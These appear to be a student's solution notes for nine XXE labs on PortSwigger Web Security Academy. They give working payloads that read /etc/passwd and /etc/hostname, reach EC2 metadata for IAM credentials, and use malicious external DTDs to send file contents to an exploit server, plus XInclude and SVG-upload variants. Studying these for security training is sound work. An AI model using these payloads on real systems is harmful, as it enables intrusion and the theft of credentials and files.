## Lab - 1: Exploiting XXE using external entities to retrieve files (A)

```xml
POST /product/stock HTTP/1.1
...
Referer: https://0aef009d032939ebc0db06e7004100cc.web-security-academy.net/product?productId=1
...
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe; </productId><storeId>1</storeId></stockCheck>
```

## Lab - 2: Exploiting XXE to perform SSRF attacks (A)

- This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response.

- The lab server is running a (simulated) EC2 metadata endpoint at the default URL, which is http://169.254.169.254/. This endpoint can be used to retrieve data about the instance, some of which might be sensitive.

```xml
POST /product/stock HTTP/1.1
...
Referer: https://0a40003e04c7970fc0d988b500d80014.web-security-academy.net/product?productId=1
...

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

will result `latest` and follow these results and find that

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

## Lab - 3: Blind XXE with out-of-band interaction (P)

```xml
POST /product/stock HTTP/1.1
...
Referer: https://0ab400fb043c2853c01955bb009b000d.web-security-academy.net/product?productId=1
...
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE xxe [ <!ENTITY xxe SYSTEM "http://rje98cecbxzy2jhcx8r0mvat5kbazz.burpcollaborator.net"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

## Lab - 4: Blind XXE with out-of-band interaction via XML parameter entities (P)

```xml
POST /product/stock HTTP/1.1
...
Referer: https://0a9e004f034227f4c0d0486f00fe007a.web-security-academy.net/product?productId=1
...

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE xxe [ <!ENTITY % xxe SYSTEM "http://i0jqlpa02tf1z8fvvua38krz2q8gw5.burpcollaborator.net"> %xxe; ]>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

## Lab - 5: Exploiting blind XXE to exfiltrate data using a malicious external DTD (P)

- This lab has a "Check stock" feature that parses XML input but does not display the result. To solve the lab, exfiltrate the contents of the /etc/hostname file.

- This end point has XXE vulns:

```
POST /product/stock HTTP/1.1
...
<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

- At the exploit server's body, write as an external DTD.

```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://exploit-0a84007903c25035c024105a01d000b3.web-security-academy.net/?x=%file;'> ">

```

- This payload path is at `https://exploit-0a84007903c25035c024105a01d000b3.web-security-academy.net/exploit`

- At the vulns end-point,

```
POST /product/stock HTTP/1.1
...

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0a84007903c25035c024105a01d000b3.web-security-academy.net/exploit">
%xxe;
%eval;
%exfil;]>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

- It calls the exploit DTD from above as `%xxe` entity.
- In exploit DTD, it calls the `%file` as /?x=%file GET request
- see in the access log of that exploit server

---

## Lab - 6: Exploiting blind XXE to retrieve data via error messages (P)

- This lab has a "Check stock" feature that parses XML input but does not display the result. To solve the lab, use an external DTD to trigger an error message that displays the contents of the /etc/passwd file. The lab contains a link to an exploit server on a different domain where you can host your malicious DTD.

- The following end point is vulnerable.

```
POST /product/stock HTTP/1.1
...
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

- In the exploit server body,

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///notexist/%file;'>">
%eval;
%exfil;
```

- At the vuln endpoint,

```
POST /product/stock HTTP/1.1
...
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0a7000b403df0d96c0ab4865010b0091.web-security-academy.net/exploit">
%xxe;
]>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

---

## Lab - 7: Exploiting XXE to retrieve data by repurposing a local DTD (E)

- This lab has a "Check stock" feature that parses XML input but does not display the result. To solve the lab, trigger an error message containing the contents of the /etc/passwd file. You'll need to reference an existing DTD file on the server and redefine an entity from it.
  `Systems using the GNOME desktop environment often have a DTD at /usr/share/yelp/dtd/docbookx.dtd containing an entity called ISOamso.`

- At XXE vuln end point, enter that payload.

```xml
<!DOCTYPE foo [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  <!ENTITY % ISOamso '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///noexistent/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
  '>
  %local_dtd;
]>
```

---

## Lab - 8: Exploiting XInclude to retrieve files (P)

- This lab has a "Check stock" feature that embeds the user input inside a server-side XML document that is subsequently parsed. Because you don't control the entire XML document you can't define a DTD to launch a classic XXE attack. To solve the lab, inject an XInclude statement to retrieve the contents of the /etc/passwd file.

- At XXE vuln end point,

```
POST /product/stock HTTP/1.1
...

productId=1<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```

---

## Lab - 9: Exploiting XXE via image file upload

- This lab lets users attach avatars to comments and uses the Apache Batik library to process avatar image files. To solve the lab, upload an image that displays the contents of the /etc/hostname file after processing. Then use the "Submit solution" button to submit the value of the server hostname.

- upload svg file

```svg
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
```

---
